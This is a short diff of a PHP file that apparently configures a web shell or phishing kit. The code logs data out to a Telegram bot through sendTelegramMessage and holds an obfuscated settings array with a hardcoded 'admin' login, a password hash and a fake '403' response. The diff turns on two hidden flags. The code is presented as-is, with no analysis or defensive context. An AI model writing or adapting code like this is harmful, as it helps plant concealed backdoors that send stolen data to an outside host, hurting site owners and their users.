@@ -9,9 +9,9 @@ sendTelegramMessage($botToken, $chatId, $logMessage);
 $iwQisXQSRKWvV = array(
 	'useMYgqrGg' => 'admin',
 	'paNdjbHrZJBbBlx' => '9f7b0c36272cf9b3608ae0a33b1a4ade',
-	'saHQnUCYTaPEHIU' => '0',
+	'saHQnUCYTaPEHIU' => '1',
 	'lovAbhGzopSyapS' => '403',
-	'shkwIPQOrexuEB' => '0',
+	'shkwIPQOrexuEB' => '1',
 	'poHcrIPZVdbXjORHJ' => false,
 	'cgUVXCQNsBeGHMdA' => true,
 );
